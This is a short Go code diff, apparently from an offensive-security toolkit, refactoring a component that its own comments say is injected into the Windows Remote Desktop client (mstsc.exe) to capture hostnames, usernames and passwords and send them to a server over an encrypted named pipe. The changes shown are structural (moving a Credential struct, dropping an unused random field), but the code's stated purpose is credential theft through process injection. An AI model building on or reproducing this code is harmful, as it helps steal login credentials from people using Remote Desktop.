@@ -14,16 +14,8 @@ import (
 	"project/internal/convert"
 	"project/internal/crypto/aes"
 	"project/internal/patch/msgpack"
-	"project/internal/random"
 	"project/internal/xpanic"
 )
-
-// Credential is the credential that stolen from mstsc.exe.
-type Credential struct {
-	Hostname string
-	Username string
-	Password string
-}
 
 // Client will be injected to the mstsc process, if get new credential,
 // it will connect to the server by named pipe, and send it.
@@ -31,13 +23,12 @@ type Client struct {
 	pipeName string
 
 	credCh chan *Credential
-	rand   *random.Rand
 	cbc    *aes.CBC
 	hook   *Hook
 
-	closeOnce sync.Once
 	ctx       context.Context
 	cancel    context.CancelFunc
+	closeOnce sync.Once
 	wg        sync.WaitGroup
 }
 
@@ -46,7 +37,6 @@ func NewClient(pipeName, password string) (*Client, error) {
 	client := Client{
 		pipeName: pipeName,
 		credCh:   make(chan *Credential, 1024),
-		rand:     random.NewRand(),
 	}
 	passHash := sha256.Sum256([]byte(password))
 	cbc, err := aes.NewCBC(passHash[:], passHash[:aes.IVSize])
